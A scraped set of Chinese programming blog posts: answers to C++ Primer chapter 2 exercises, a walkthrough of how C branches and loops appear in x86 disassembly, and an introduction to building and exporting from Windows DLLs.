练习2.10下列变量的初值分别是什么？ 123456789101112#include &lt;iostram&gt;std::string global_str;int global_int;int main(){ int local_int; std::string local_str; std::cout &lt;&lt; global_str &lt;&lt; std::endl; //空字符串 std::cout &lt;&lt; global_int &lt;&lt; std::endl; //0 std::cout &lt;&lt; local_int &lt;&lt; std::endl; //乱码 std::cout &lt;&lt; local_str &lt;&lt; std::endl; //空字符串} 练习2.11指出下面的语句是声明还是定义： (a) extern int ix = 1024; //定义 (b) int iy; //定义 (c) extern int iz; //声明 练习2.121234567891011int i = 42;int main(){ int i = 100; int j = i; int k = ::i; std::cout &lt;&lt; i &lt;&lt; std::endl; //100 std::cout &lt;&lt; j &lt;&lt; std::endl; //100 std::cout &lt;&lt; k &lt;&lt; std::endl; //42 return 0;} j的值为100; 练习2.1312345678910int main(){ int i = 100, sum = 0; for (int i = 0; i != 10; ++i) //此时的i是一个局部变量，不会覆盖上面的i=100，0到9的累加为45 { sum += i; } std::cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; sum &lt;&lt; std::endl;} 合法，i=100，sum=45 练习2.14下面的哪个定义是不合法的？为什么？ a) int ival = 1.01 //不合法，浮点数赋值给整型 b) int &amp;rvall - 1.01 //不合法，引用的初始化必须是一个对象 c) int &amp;ravle = ival; //合法 d) int &rva13; //引用必须赋初值 练习2.15考察下面的所有赋值然后回答：哪些赋值是不合法的？为什么？哪些赋值是合法的？它们执行了哪些操作？ 12int i = 0, &amp;r1 = i; double d = 0, &amp;r2 = d; (a) r2 = 3.14159; (b) r2 = r1; (c) i = r2; (d) r1 = d; a)合法 d的值改变为3.14159 b)合法 d的值为0.00 c)合法 小数点后截断 d)合法 小数点后截断 练习2.16执行下面的代码段将输出什么结果？ 123int i, &amp;ri = i;i = 5; ri = 10;std::cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; ri &lt;&lt; std::endl; 输出10，10 ri指向i，他们两个共用一块内存地址 练习2.17编写代码分别改变指针的值以及指针所指对象的值。 1234567891011121314151617int main(){ int *p,*p1; int i = 10,j=20; p = &amp;i; //p=10; p1 = &amp;j; //p1=20; std::cout &lt;&lt; *p &lt;&lt; std::endl; std::cout &lt;&lt; i &lt;&lt; std::endl; *p = j; //p=20; std::cout &lt;&lt; *p &lt;&lt; std::endl; std::cout &lt;&lt; i &lt;&lt; std::endl; p = p1; //p=20; std::cout &lt;&lt; *p &lt;&lt; std::endl; return 0;} 练习2.18说明指针和引用的主要区别 引用是另一个对象的别名，而指针本身就是一个对象。 引用必须初始化，并且一旦定义了引用就无法再绑定到其他对象。而指针无须在定义时赋初值，也可以重新赋值让其指向其他对象。 练习2.19123int i = 42;int *p1 = &amp;i; //p1=42*p1 = *p1 * *p1; //p1 = 42 * 42 = 1764 练习2.20请解释下述定义。在这些定义中有非法的吗？如果有，为什么？ 1234int i = 42;double* dp = &amp;i; //不能将一个指向 double 的指针指向 int 。int* ip = i; //简介寻址不同int* p = &amp;i; //合法 练习2.21假设 p 是一个 int 型指针，请说明下述代码的含义。 第一句判断 p 是不是一个空指针, 第二句判断 p 所指向的对象的值是不是为0 练习2.22给定指针 p，你能知道它是否指向了一个合法的对象吗？如果能，叙述判断的思路；如果不能，也请说明原因。 首先需要判断这个指针是否合法； 1if (p != NULL) 练习2.23在下面这段代码中为什么 p 合法而 lp 非法？ 123int i = 42;void *p = &amp;i;long *lp = &amp;i; //类型不兼容 练习2.26下面的哪些初始化是合法的？请说明原因。 1234567int i = -1, &amp;r = 0; // 不合法, r 必须引用一个对象int *const p2 = &amp;i2; // 合法，常量指针const int i = -1, &amp;r = 0; // 合法const int *const p3 = &amp;i2; // 合法const int *p1 = &amp;i2; // 合法const int &amp;const r2; // 不合法, r2 是引用，引用没有顶层 constconst int i2 = i, &amp;r = i; // 合法 练习2.27说明下面的这些定义是什么意思，挑出其中不合法的。 12345int i, *const cp; // 不合法, const 指针必须初始化int *p1, *const p2; // 不合法, const 指针必须初始化const int ic, &amp;r = ic; // 不合法, const int 必须初始化const int *const p3; // 不合法, const 指针必须初始化const int *p; // 合法. 一个指针，指向 const int 练习2.28假设已有上一个练习中定义的那些变量，则下面的哪些语句是合法的？请说明原因。 123456i = ic; // 合法, 常量赋值给普通变量p1 = p3; // 不合法, p3 是const指针不能赋值给普通指针p1 = &amp;ic; // 不合法, 普通指针不能指向常量p3 = &amp;ic; // 合法, p3 是常量指针且指向常量p2 = p1; // 合法, 可以将普通指针赋值给常量指针ic = *p3; // 合法, 对 p3 取值后是一个 int 然后赋值给 ic 练习2.29利用本节定义的变量，判断下列语句的运行结果。 123456a=42; //intb=42; //int（ci的顶层const在拷贝的时候忽略了）c=42; //intd=42; //int*e=42; //const int* g=42; //const int引用 练习2.30判断下列定义推断出的类型是什么，然后编写程序进行验证。 123const int i = 42; //const intauto j = i; const auto &amp;k = i; auto *p = &amp;i; //int const int&amp; //const int*const auto j2 = i, &amp;k2 = i; //const int const int&amp;","link":"/2020/07/22/C-Primer-%E5%9F%BA%E7%A1%80/"},{"title":"C反汇编 - 分支","text":"C语言有两种类型的语句可以控制程序的执行流程，一种是分支，一种是循环； 分支ifif(表达书) ​ 语句; 12345678910111213141516#include &lt;stdio.h&gt;int main(){ int x = 10; int y = 20; if(x&gt;y) { printf(&quot;x&gt;y\\r\\n&quot;); } if(x&lt;y) { printf(&quot;x&lt;y\\r\\n&quot;); } system(&quot;pause&quot;);} if…elseif(表达式) ​ 语句; else ​ 语句; 12345678910111213141516#include &lt;stdio.h&gt;int main(){ int x = 10; int y = 20; if(x&gt;y) { printf(&quot;x&gt;y\\r\\n&quot;); } else { printf(&quot;x&lt;y\\r\\n&quot;); } system(&quot;pause&quot;);} if…elseifif(表达式) ​ 语句; elseif ​ 语句; else ​ 语句; 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main(){ int x = 10; int y = 20; if(x&gt;5) { printf(&quot;5\\r\\n&quot;); } else if(x&gt;6) { printf(&quot;6\\r\\n&quot;); } else if(x&gt;7) { printf(&quot;7\\r\\n&quot;); } else if(x&gt;8) { printf(&quot;8\\r\\n&quot;); } system(&quot;pause&quot;);} 在使用多个else if的时候，如果条件全部成立，则只会执行一条 在汇编的视角查看代码： 1234567891011121314151600401028 |. C745 FC 0A000&gt;mov [local.1],0xA ;0040102F |. C745 F8 14000&gt;mov [local.2],0x14 ;两个局部变量，存储位置在[ebp-4,ebp-8]00401036 |. 8B45 FC mov eax,[local.1]00401039 |. 3B45 F8 cmp eax,[local.2] ; kernel32.770D33CA ；cmp指令做比较0040103C |. 7E 0F jle short main.0040104D ;小于或等于则跳转0040103E |. 68 2C404200 push offset main.??_C@_05NIOK@x?$DOy?$AN&gt;; /format = &quot;x&gt;y&quot;00401043 |. E8 68010000 call main.printf ; \\printf00401048 |. 83C4 04 add esp,0x40040104B |. EB 0D jmp short main.0040105A ;控制如果小于或等于则跳转后，不执行0040104D的语句0040104D |&gt; 68 24404200 push offset main.??_C@_05JCEO@x?$DMy?$AN&gt;; /format = &quot;x&lt;y&quot;00401052 |. E8 59010000 call main.printf ; \\printf00401057 |. 83C4 04 add esp,0x40040105A |&gt; 68 1C404200 push offset main.??_C@_05PBCN@pause?$AA@ ; /command = &quot;pause&quot;0040105F |. E8 3C000000 call main.system ; \\system switchswitch只可以进行等值判断 switch(表达式) { ​ case 常量表达式1: ​ 语句; ​ break; ​ case 常量表达式2: ​ 语句; ​ break; ​ case 常量表达式3: ​ 语句; ​ break; ​ case 常量表达式4: ​ 语句; ​ break; ​ default: ​ 语句; } 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main(){ int i = 0; scanf(&quot;%d&quot;,&amp;i); switch (i) { case 1: printf(&quot;1\\r\\n&quot;); break; case 2: printf(&quot;2\\r\\n&quot;); break; case 3: printf(&quot;3\\r\\n&quot;); break; case 4: printf(&quot;4\\r\\n&quot;); break; default: printf(&quot;No\\r\\n&quot;); } return 0;} 在反汇编中查看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707100401040 . 8B4D FC mov ecx,dword ptr ss:[ebp-0x4] ;取到局部变量赋值给ecx中00401043 . 894D F8 mov dword ptr ss:[ebp-0x8],ecx ;ecx中的值赋值给ebp-8，因为我们只有一个局部变量00401046 . 8B55 F8 mov edx,dword ptr ss:[ebp-0x8] ;ebp-8的值赋值给edx00401049 . 83EA 01 sub edx,0x1 ;edx减一，它会找到最小的那个值，然后减去0040104C . 8955 F8 mov dword ptr ss:[ebp-0x8],edx ;把edx的值赋给[ebp-9]0040104F . 837D F8 08 cmp dword ptr ss:[ebp-0x8],0x8 ;比较edx和8大小，大于8则跳转00401053 . 0F87 94000000 ja switch.004010ED ;跳转00401059 . 8B45 F8 mov eax,dword ptr ss:[ebp-0x8] ;ebp-8的地址赋值给eax中0040105C . FF2485 0D1140&gt;jmp dword ptr ds:[eax*4+0x40110D] ; 我们输入的eax为5,自减一次1为4，[4*4+40110D]，得到的结果是40111D switch.004010A200401063 &gt; 68 44504200 push offset switch.??_C@_03MJGL@1?$AN?6?&gt;; /format = &quot;1&quot;00401068 . E8 13010000 call switch.printf ; \\printf0040106D . 83C4 04 add esp,0x400401070 . E9 85000000 jmp switch.004010FA00401075 &gt; 68 40504200 push offset switch.??_C@_03DPFA@2?$AN?6?&gt;; /format = &quot;2&quot;0040107A . E8 01010000 call switch.printf ; \\printf0040107F . 83C4 04 add esp,0x400401082 . EB 76 jmp short switch.004010FA00401084 &gt; 68 3C504200 push offset switch.??_C@_03GNEG@3?$AN?6?&gt;; /format = &quot;3&quot;00401089 . E8 F2000000 call switch.printf ; \\printf0040108E . 83C4 04 add esp,0x400401091 . EB 67 jmp short switch.004010FA00401093 &gt; 68 38504200 push offset switch.??_C@_03NDCH@4?$AN?6?&gt;; /format = &quot;4&quot;00401098 . E8 E3000000 call switch.printf ; \\printf0040109D . 83C4 04 add esp,0x4004010A0 . EB 58 jmp short switch.004010FA004010A2 &gt; 68 34504200 push offset switch.??_C@_03IBDB@5?$AN?6?&gt;; /format = &quot;5&quot;004010A7 . E8 D4000000 call switch.printf ; \\printf004010AC . 83C4 04 add esp,0x4004010AF . EB 49 jmp short switch.004010FA004010B1 &gt; 68 30504200 push offset switch.??_C@_03HHAK@6?$AN?6?&gt;; /format = &quot;6&quot;004010B6 . E8 C5000000 call switch.printf ; \\printf004010BB . 83C4 04 add esp,0x4004010BE . EB 3A jmp short switch.004010FA004010C0 &gt; 68 2C504200 push offset switch.??_C@_03CFBM@7?$AN?6?&gt;; /format = &quot;7&quot;004010C5 . E8 B6000000 call switch.printf ; \\printf004010CA . 83C4 04 add esp,0x4004010CD . EB 2B jmp short switch.004010FA004010CF &gt; 68 28504200 push offset switch.??_C@_03LMI@8?$AN?6?$&gt;; /format = &quot;8&quot;004010D4 . E8 A7000000 call switch.printf ; \\printf004010D9 . 83C4 04 add esp,0x4004010DC . EB 1C jmp short switch.004010FA004010DE &gt; 68 24504200 push offset switch.??_C@_03FJNO@9?$AN?6?&gt;; /format = &quot;9&quot;004010E3 . E8 98000000 call switch.printf ; \\printf004010E8 . 83C4 04 add esp,0x4004010EB . EB 0D jmp short switch.004010FA004010ED &gt; 68 1C504200 push offset switch.??_C@_04LAJA@No?$AN?6&gt;; /format = &quot;No&quot;004010F2 . E8 89000000 call switch.printf ; \\printf004010F7 . 83C4 04 add esp,0x4004010FA &gt; 33C0 xor eax,eax004010FC . 5F pop edi ; switch.??_C@_03IBDB@5?$AN?6?$AA@004010FD . 5E pop esi ; switch.??_C@_03IBDB@5?$AN?6?$AA@004010FE . 5B pop ebx ; switch.??_C@_03IBDB@5?$AN?6?$AA@004010FF 83 db 8300401100 &gt; . c448 3b les ecx,fword ptr ds:[eax+0x3b]00401103 . ec in al,dx00401104 . E8 57010000 call switch.__chkesp00401109 . 8BE5 mov esp,ebp0040110B . 5D pop ebp ; switch.??_C@_03IBDB@5?$AN?6?$AA@0040110C . C3 retn 查看40111D的内存地址： whilegoto123456789101112131415161718192021222324 #include &lt;stdio.h&gt;void Print(int x){ int i = 0;A: printf(&quot;%d\\r\\n&quot;,i); i++; if(i&lt;=x) { goto A; } return 0;}int main(){ __asm { mov eax,eax } Print(10); return 0;} 我们查看反汇编： 123456789101112131415161718192021222324252627282930313233343500401020 &gt;/&gt; \\55 push ebp00401021 |. 8BEC mov ebp,esp00401023 |. 83EC 44 sub esp,0x4400401026 |. 53 push ebx00401027 |. 56 push esi00401028 |. 57 push edi00401029 |. 8D7D BC lea edi,dword ptr ss:[ebp-0x44]0040102C |. B9 11000000 mov ecx,0x1100401031 |. B8 CCCCCCCC mov eax,0xCCCCCCCC00401036 |. F3:AB rep stos dword ptr es:[edi]00401038 |. C745 FC 00000&gt;mov dword ptr ss:[ebp-0x4],0x0 ;初始化局部变量0040103F |&gt; 8B45 FC /mov eax,dword ptr ss:[ebp-0x4] ;局部变量的值传递给eax中00401042 |. 50 |push eax ; /&lt;%d&gt; = 776533B8 (2003121080.)00401043 |. 68 1C204200 |push offset while.??_C@_04GNLP@?$CFd?$A&gt;; |format = &quot;%d&quot;00401048 |. E8 93000000 |call while.printf ; \\printf0040104D |. 83C4 08 |add esp,0x8 ;抬高栈00401050 |. 8B4D FC |mov ecx,dword ptr ss:[ebp-0x4] ;局部变量00401053 |. 83C1 01 |add ecx,0x1 ;局部变量自增100401056 |. 894D FC |mov dword ptr ss:[ebp-0x4],ecx ;00401059 |. 8B55 FC |mov edx,dword ptr ss:[ebp-0x4]0040105C |. 3B55 08 |cmp edx,dword ptr ss:[ebp+0x8] ;与我们传递的值作比较0040105F |. 7F 02 |jg short while.0040106300401061 |.^ EB DC \\jmp short while.0040103F00401063 |&gt; 5F pop edi ; kernel32.776533CA00401064 |. 5E pop esi ; kernel32.776533CA00401065 |. 5B pop ebx ; kernel32.776533CA00401066 |. 83C4 44 add esp,0x4400401069 |. 3BEC cmp ebp,esp0040106B |. E8 F0000000 call while.__chkesp00401070 |. 8BE5 mov esp,ebp00401072 |. 5D pop ebp ; kernel32.776533CA00401073 \\. C3 retn while1234567891011121314151617181920void Whhile(int x){ int i = 0; while (i&lt;x) { printf(&quot;%d\\r\\n&quot;,i); i++; }}int main(){ __asm { mov eax,eax } Whhile(10); system(&quot;pause&quot;); return 0;} 我们查看反汇编代码： 1234567891011121314151617181920212223242526272829303132333435004010A0 &gt;/&gt; \\55 push ebp004010A1 |. 8BEC mov ebp,esp004010A3 |. 83EC 44 sub esp,0x44004010A6 |. 53 push ebx004010A7 |. 56 push esi004010A8 |. 57 push edi004010A9 |. 8D7D BC lea edi,dword ptr ss:[ebp-0x44]004010AC |. B9 11000000 mov ecx,0x11004010B1 |. B8 CCCCCCCC mov eax,0xCCCCCCCC004010B6 |. F3:AB rep stos dword ptr es:[edi]004010B8 |. C745 FC 00000&gt;mov dword ptr ss:[ebp-0x4],0x0004010BF |&gt; 8B45 FC /mov eax,dword ptr ss:[ebp-0x4]004010C2 |. 3B45 08 |cmp eax,dword ptr ss:[ebp+0x8] ;局部变量和传递参数作比较004010C5 |. 7D 1C |jge short while.004010E3 ;是否跳出程序执行004010C7 |. 8B4D FC |mov ecx,dword ptr ss:[ebp-0x4]004010CA |. 51 |push ecx ; /&lt;%d&gt; = 0x0004010CB |. 68 1C404200 |push offset while.??_C@_04GNLP@?$CFd?$A&gt;; |format = &quot;%d&quot;004010D0 |. E8 9B000000 |call while.printf ; \\printf004010D5 |. 83C4 08 |add esp,0x8004010D8 |. 8B55 FC |mov edx,dword ptr ss:[ebp-0x4]004010DB |. 83C2 01 |add edx,0x1004010DE |. 8955 FC |mov dword ptr ss:[ebp-0x4],edx004010E1 |.^ EB DC \\jmp short while.004010BF004010E3 |&gt; 5F pop edi ; while.00401131004010E4 |. 5E pop esi ; while.00401131004010E5 |. 5B pop ebx ; while.00401131004010E6 |. 83C4 44 add esp,0x44004010E9 |. 3BEC cmp ebp,esp004010EB |. E8 00010000 call while.__chkesp004010F0 |. 8BE5 mov esp,ebp004010F2 |. 5D pop ebp ; while.00401131004010F3 \\. C3 retn do…whiledo…while语句有一个特点：无论条件成立不成立，那么它一定会执行一次； 12345678910111213141516171819202122void doo(int x){ int i = 1; do { printf(&quot;%d\\r\\n&quot;,i); i++; }while(i&lt;x);}int main(){ __asm { mov eax,eax } doo(0); system(&quot;pause&quot;); return 0;} 查看反汇编代码： 1234567891011121314151617181920212223242526272829303132333400401110 &gt;/&gt; \\55 push ebp00401111 |. 8BEC mov ebp,esp00401113 |. 83EC 44 sub esp,0x4400401116 |. 53 push ebx00401117 |. 56 push esi00401118 |. 57 push edi00401119 |. 8D7D BC lea edi,dword ptr ss:[ebp-0x44]0040111C |. B9 11000000 mov ecx,0x1100401121 |. B8 CCCCCCCC mov eax,0xCCCCCCCC00401126 |. F3:AB rep stos dword ptr es:[edi]00401128 |. C745 FC 01000&gt;mov dword ptr ss:[ebp-0x4],0x10040112F |&gt; 8B45 FC /mov eax,dword ptr ss:[ebp-0x4]00401132 |. 50 |push eax ; /&lt;%d&gt; = CCCCCCCC (-858993460.)00401133 |. 68 1C404200 |push offset while.??_C@_04GNLP@?$CFd?$A&gt;; |format = &quot;%d&quot;00401138 |. E8 A3000000 |call while.printf ; \\printf0040113D |. 83C4 08 |add esp,0x800401140 |. 8B4D FC |mov ecx,dword ptr ss:[ebp-0x4]00401143 |. 83C1 01 |add ecx,0x100401146 |. 894D FC |mov dword ptr ss:[ebp-0x4],ecx00401149 |. 8B55 FC |mov edx,dword ptr ss:[ebp-0x4]0040114C |. 3B55 08 |cmp edx,dword ptr ss:[ebp+0x8]0040114F |.^ 7C DE \\jl short while.0040112F00401151 |. 5F pop edi ; while.004011A100401152 |. 5E pop esi ; while.004011A100401153 |. 5B pop ebx ; while.004011A100401154 |. 83C4 44 add esp,0x4400401157 |. 3BEC cmp ebp,esp00401159 |. E8 02010000 call while.__chkesp0040115E |. 8BE5 mov esp,ebp00401160 |. 5D pop ebp ; while.004011A100401161 \\. C3 retn for123456789101112131415161718void fo(int x){ for(;x&lt;10;x++) { printf(&quot;%d\\r\\n&quot;,x); }}int main(){ __asm { mov eax,eax } fo(0); system(&quot;pause&quot;); return 0;} 12345678910111213141516171819202122232425262728293031323300401180 &gt;/&gt; \\55 push ebp00401181 |. 8BEC mov ebp,esp00401183 |. 83EC 40 sub esp,0x4000401186 |. 53 push ebx00401187 |. 56 push esi00401188 |. 57 push edi00401189 |. 8D7D C0 lea edi,dword ptr ss:[ebp-0x40]0040118C |. B9 10000000 mov ecx,0x1000401191 |. B8 CCCCCCCC mov eax,0xCCCCCCCC00401196 |. F3:AB rep stos dword ptr es:[edi]00401198 |. EB 09 jmp short while.004011A30040119A |&gt; 8B45 08 /mov eax,dword ptr ss:[ebp+0x8]0040119D |. 83C0 01 |add eax,0x1004011A0 |. 8945 08 |mov dword ptr ss:[ebp+0x8],eax004011A3 |&gt; 837D 08 0A cmp dword ptr ss:[ebp+0x8],0xA004011A7 |. 7D 13 |jge short while.004011BC004011A9 |. 8B4D 08 |mov ecx,dword ptr ss:[ebp+0x8]004011AC |. 51 |push ecx ; /&lt;%d&gt; = 0x0004011AD |. 68 1C404200 |push offset while.??_C@_04GNLP@?$CFd?$A&gt;; |format = &quot;%d&quot;004011B2 |. E8 29000000 |call while.printf ; \\printf004011B7 |. 83C4 08 |add esp,0x8004011BA |.^ EB DE \\jmp short while.0040119A004011BC |&gt; 5F pop edi ; while.0040F3F1004011BD |. 5E pop esi ; while.0040F3F1004011BE |. 5B pop ebx ; while.0040F3F1004011BF |. 83C4 40 add esp,0x40004011C2 |. 3BEC cmp ebp,esp004011C4 |. E8 97000000 call while.__chkesp004011C9 |. 8BE5 mov esp,ebp004011CB |. 5D pop ebp ; while.0040F3F1 符号扩展123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;void Function1() { char ci = 0xFF; short si = ci; int ni = ci; } //无符号小转大 void Function2() { unsigned char ci = 0xFF; unsigned short si = ci; unsigned int ni = ci; } int main(){ __asm { mov eax,eax } Function1(); Function2(); return 0;} movsxmovsx先符号扩展，再传送。 1234mov al,0ffmovsx cx,almov al,80movsx cx,al movsz先零扩展，再传送 1234MOV AL,0FF MOVZX CX,AL MOV AL,80 MOVSX CX,AL 跳转123456789101112131415161718192021222324252627281、案例一 mov eax,dword ptr [ebp+8] 分析：cmp指令 影响标志位 cmp eax,dword ptr [ebp+0Ch] jle ：小于或者等于就跳转到00401059 jle 00401059 2、案例二 mov eax,dword ptr [ebp+8] 分析：cmp指令 影响标志位 cmp eax,dword ptr [ebp+0Ch] jl ：小于则跳转 jl 00401059 3、案例三 mov eax,dword ptr [ebp+8] jge ：大于或者等于则跳转 cmp eax,dword ptr [ebp+0Ch] jge 00401059 4、案例四 mov eax,dword ptr [ebp+8] jg ：大于则跳转 cmp eax,dword ptr [ebp+0Ch] jg 00401059","link":"/2020/04/30/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%88%86%E6%94%AF/"},{"title":"DLL基础","text":"动态链接库(DLL)一直是Windows操作系统得基础。WindowsAPI中得得所有函数都包含在DLL中。3个重要得DLL是Kernel32.dll，它用于内存管理、进程和线程得各个函数；User32.dll，它用于执行用户交互界面任务得各个函数；GDI32.dll，它用于画图和显示文本得各个函数。 DLL基础使用DLL的一些原因： 扩展了程序的特性，DLL可以动态的装入进程的地址空间，因此应用程序可以在运行时装入相应的代码，以便根据需要执行这些操作 可以使用多种语言来编程 简化了软件项目的管理，可以实现模块化开发 节约内存，如果多个程序使用同一个DLL，那么只需要被装入内存一次，所有程序都可以共享它的各个页面 资源的共享，DLL可以实现多个程序使用DLL来共享资源 有助于程序本地化，应用程序常常使用DLL对自己进行本地化 解决平台差异，不同的WIndows版本配有不同的函数 可以实现一些特殊目的，例如钩子 DLL与进程的地址空间创建DLL比创建应用程序更容易，因为DLL往往包含一组应用程序可以使用的自主函数，DLL只是一组源代码模块，每个模块包含了应用程序(可执行文件)或另一个DLL将要调用的一组函数。当所有源代码文件编译后，它们就像应用程序的执行文件那样被链接程序所链接。 对于DLL来说，必须设定该连链程序的/DLL开关 在应用程序（或DLL）能够调用DLL中的函数之前，DLL问价你必须被映射到调用进程的地址空间中。一旦DLL文件被映像到调用进程的地址空间中，DLL的函数就可以供进程中的运行的所有线程使用。 当一个线程需要调用DLL函数的时候，该DLL函数要查看线程的堆栈，以便检索它传递的参数，并将线程的堆栈用于它需要的任何局部变量，DLL中的代码创建的任何对象由调用线程所拥有，DLL本身不拥有任何东西 DLL库中的全局和静态变量也受写时复制机制保护。这样多个进程载入同一个DLL并不会互相破坏数据。 单个地址空间是由一个可执行模块和若干个DLL模块组成的 模块中有些可以链接到静态版本的C/C++运行期库，有些可以链接到一个DLL版本的C/C++运行期库 有些模块不需要C/C++运行期库 若干个C/C++运行期库可以存在于单个地址空间中 DLL的总体运行情况 DLL中导入函数和变量的模块称为“可执行模块” 导出函数和变量以供可执行文件使用的模块称为“DLL模块” ， DLL模块也可以导入一些包含在其他DLL模块中的函数和变量。 如果一个可执行模块要从另一个DLL模块中导入函数和变量，必须先构建该DLL模块，然后再构建可执行模块。 构建DLL的步骤： 创建一个头文件，包含了要在DLL中导出的函数原型，结构以及符号等。 DLL的所有源文件都必须包含这个头文件 创建CPP文件来实现DLL模块中导出的函数和变量。 构建DLL模块的时候，编译器会对每个源文件进行处理并产生一个obj模块（每个源文件对应一个obj模块） 所有obj模块都创建完毕以后，连接器会将所有obj模块的内容合并起来，产生一个单独的DLL映像文件。映像文件保护所有DLL的二进制代码以及全局静态变量。 连接器检测到DLL的源文件输出了至少一个函数或变量。连接器还会创建一个.lib文件。这个.lib文件非常小，因为它并不包含任何函数或变量。它只是列出了所有被导出的函数和变量的符号名。为了构建可执行模块，这个文件是必须的。 构建可执行模块： 所有引用了DLL的导出函数，变量，数据结构或符号的源文件中，必须包含由DLL的开发人员所创建的头文件。 创建C/C++源文件来实现想要包含在可执行模块中的函数和变量。可以引用DLL的头文件中定义的函数和变量 在构建可执行模块的时候，编译器会对每个源文件进行处理并产生一个obj模块（每个源文件对应一个obj模块） 所有obj模块都创建完毕以后，连接器会将所有obj模块的内容合并起来，产生一个单独的可执行映像文件。这个映像文件包含了可执行文件中所有的二进制代码以及静态全局变量。该可执行模块还包含一个导入段（import section， .idata）列出了所有它需要的DLL模块的名称。 对于列出的每个DLL还记录了可执行文件的二进制代码从中引用的函数和变量的符号名。（操作系统的加载程序会解析这个导入段） 一旦DLL和可执行模块都构建完毕，进程就可以执行了。当试图运行可执行模块的时候，操作系统的加载程序会执行以下步骤。 加载程序为新进程床架你一个虚拟地址空间，并将可执行模块映射到新进程的地址空间中 加载程序接着解析可执行模块的导入段。对导入段列出的每个DLL，加载程序会在用户的系统中对该DLL模块进行定位，并将该DLL映射到进程的地址空间中。 由于DLL可能导入其他DLL模块中的函数和变量，因此DLL模块可能还有自己的导入段并需要将它所需的DLL模块也映射到进程地址空间，初始化可能会耗费很长的时间。 一旦加载程序将可执行模块和所有DLL模块映射到进程的地址空间以后，进程的主线程可以开始执行，这样应用程序就能运行了。 创建DLL模块dll可以导出函数，变量或C++类。 通常不应该导出变量，这等于去掉了代码的抽象层 也不应该导出C++类，除非调用方和构建DLL方使用相同的编译器。（C++语言生成的二进制代码具有编译器依赖性） 创建DLL的时候，首先应该创建头文件来包含想要导出的变量（类型和名称）和函数。这个头文件还必须定义导出的函数或变量所用到的任何符号和数据结构。 DLL的所有源文件都必须包含这个头文件。还必须随DLL一起发布这个头文件。这样任何可能需要导入这些函数或变量的源文件就可以包含该头文件。 代码： 1234567891011121314151617181920212223242526272829303132333435/************************************************************************//* Module : MyLib.h *//************************************************************************/#ifndef MYLIBAPI_HEADER#define MYLIBAPI_HEADER#ifdef MYLIBAPI// MYLIBAPI shoulde be defined in all of the DLL's source// code modules before this header file is included.// All functions/variables are being exported.#else// This header file is included by an EXE source code module.// Indicate that all functions/variables are being imported.#define MYLIBAPI extern &quot;C&quot; __declspec(dllimport)#endif//////////////////////////////////////////////////////////////////////////// Define any data structures and symbols here.//////////////////////////////////////////////////////////////////////////// Define exported variables here. (NOTE: Avoid exporting variables.)MYLIBAPI int g_nResult;//////////////////////////////////////////////////////////////////////////// Define exported function prototypes here.MYLIBAPI int Add(int nLeft, int nRight);#endif 123456789101112131415161718192021222324/************************************************************************//* Module: MyLibFile1.cpp *//************************************************************************/// Include the standard windows and C-Runtime header files here.#include &lt;windows.h&gt;// This DLL source code file exports functions and variables.#define MYLIBAPI extern &quot;C&quot; __declspec(dllexport)// Included the exported data structures, symbols, functions, and variables.#include &quot;mylib.h&quot;//////////////////////////////////////////////////////////////////////////// Place the code for this DLL source code file here.int g_nResult;int Add(int nLeft, int nRight) { g_nResult = nLeft + nRight; return g_nResult;}///////////////////////////// End of File //////////////////////////////// 在编译前面的DLL源文件时，MYLIBAPI在包含Mylib.h之前被定义为__declspec(dllexport) 这样编译器看到被它修饰的变量函数，就知道应该在DLL模块中导出该变量，函数或C++类。 在cpp文件中，不必在被导出的变量和函数前面加MYLIBAPI标识符。因为在解析头文件的时候编译器已经记住了应该要导出哪些变量或函数 extern “C”修饰符告知编译器在编写C++代码的时候，以C语言的方式来编译不会使用修饰符。 C++编译器通常会对函数名进行改写。 如果后续被c语言编写的可执行文件引用，c编译器不会对函数名进行改写。但是在链接的时候会找不到所引用的C++函数名（以及被C++编译器改写了） extern “C”告知编译器不要对函数名进行改写 在可执行文件中引用dll的头文件的时候应该使用__declspec(dllimport)这样编译器就知道可执行文件的源文件要从DLL模块导入一些变量和函数。 导出函数__declspec(dllexport)修改符，当C/C++编译器看到变量、函数原型、C++类之前的这个修改符的时候，它就将某些附加信息嵌入产生的/obj文件中。当链接DLL的所有.obj文件的时候，链接程序将对这些信息进行分析 .Lib文件包含一个DLL输出的符号列表，除了创建.lib文件以外，链接程序还要将一个输出符号表嵌入产生的DLL文件中，这个输出节彪悍一个输出变量、函数和类符号的列表。该链接程序还能指明在何处找到每个符号的相对虚拟地址（RAV）放入DLL模块 使用dumpbin(带有-exports开关)查看我们生成的DLL 123456789101112131415161718192021222324252627282930F:\\Code\\Kernel_Code\\DLL\\MyLib\\Mylib\\Mylib&gt;dumpbin -exports MyLibFile1.dllMicrosoft (R) COFF Binary File Dumper Version 6.00.8168Copyright (C) Microsoft Corp 1992-1998. All rights reserved.Dump of file MyLibFile1.dllFile Type: DLL Section contains the following exports for MyLibFile1.dll 0 characteristics 5D954650 time date stamp Thu Oct 03 08:52:32 2019 0.00 version 1 ordinal base 2 number of functions 2 number of names ordinal hint RVA name 1 0 00001000 Add 2 1 00008430 g_nResult Summary 3000 .data 1000 .rdata 1000 .reloc 4000 .text 符号是按照字母排序的。 RVA表示一个偏移量，导出符号位于dll文件映像中的这个位置。 ordinal是为了兼容16位windows源码保持向后兼容保留的。 你可以将序号用于你创建的任何D L L，并且按照序号将你的可执行文件链接到这些D L L。M i c r o s o f t保证，即使在将来的操作系统版本中，这个方法也是可行的。但是在我的工作中总是避免使用序号，并且从现在起只按名字进行链接。 创建用于非VC++工具的DLL如果创建DLL和可执行文件使用的都是VC++那么没什么问题。如果VC++创建的DLL要与其他厂商工具包构建的可执行文件链接，就必须做一个些额外的工作。 当以__stdcall (WINAPI)导出函数的时候，MS的C编译器也会对函数进行改名。 例如以下函数 __declspec(dllexport) LONG __stdcall MyFunc(int a, int b); 编译以后导出的符号是 _MyFunc@8 8表示传递给函数参数的字节数。 如果使用另一个工具来构建可执行文件的时候，连接器将试图连接到一个名为MyFunc的函数。由于该函数在VC++构建的DLL中并不存在，因此链接会失败。 